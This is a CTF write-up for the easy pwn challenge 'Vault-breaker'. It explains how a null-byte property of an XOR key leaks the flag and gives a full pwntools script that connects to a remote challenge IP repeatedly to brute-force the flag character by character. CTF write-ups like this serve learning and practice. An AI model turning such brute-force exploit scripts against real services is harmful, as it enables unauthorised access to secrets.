# Vault-breaker

```
score: 300
solved: 194
difficulty: easy
tags: pwn, brute-force
```

## Identify vulnerbility
- At the start, a 32-byte key is generated randomly.
- Have 2 options:
    1. Generate a new random key with `length` from user. If catch a `\x00` byte in key, this byte will be replaced.
    2. Xor the key with `flag` and export to user.
### My stup*d bug:
Because no `\x00` byte in `key`, so we can brute-force `flag` by checking the printable character does not appear in output.
### Smart bug:
Because the `key` end with `\x00` (string must end with `\x00`) so if enter length with `i`, value of `key[i+1]=\x00`. By generating `length` from 1->len_of_flag we can leak byte by byte of `flag`. [ref](https://ctftime.org/writeup/33864)
## My stup*d exploit:
```python
from pwn import *
import string
import time

def fillter(passwd,tmp):
    for i in range(len(passwd)):
        x = passwd[i].find(tmp[i])
        if x > -1:
            passwd[i] = passwd[i][:x] + passwd[i][x+1:]

true_pass = b""
def print_pass(arr):
    for i in range(len(arr)):
        size = len(arr[i])
        if size == 1:
            global true_pass
            true_pass[i] = arr[i]
            tmp = b""
            for i in true_pass:
                tmp += i
            print(tmp)

def get_pass():
    # p = process("./vault-breaker")
    p = remote("157.245.46.136",30795)
    p.sendafter(b"> ",b"1\n")
    p.sendafter(b"(0-31): ",b"31\n")
    p.sendafter(b"> ",b"2\n")
    p.recvuntil(b"Vault: ")
    tmp = p.recv()[:-1]
    p.close()
    return tmp

def main():
    tmp = get_pass()
    global passwd
    passwd = [string.printable.encode() for i in range(len(tmp))]
    l = len(tmp)
    global true_pass
    true_pass = [b"*" for i in range(len(tmp))]
    count= 0
    while(True):
        try:
            count = count + 1
            tmp = get_pass()
            if len(tmp) != l:
                continue
            fillter(passwd,tmp)
            print_pass(passwd)
            if count % 20 == 0:
                print("[COUNT] : {}".format(count))
        except:
            pass

if __name__ == "__main__":
    context.log_level = 'error'
    main()

```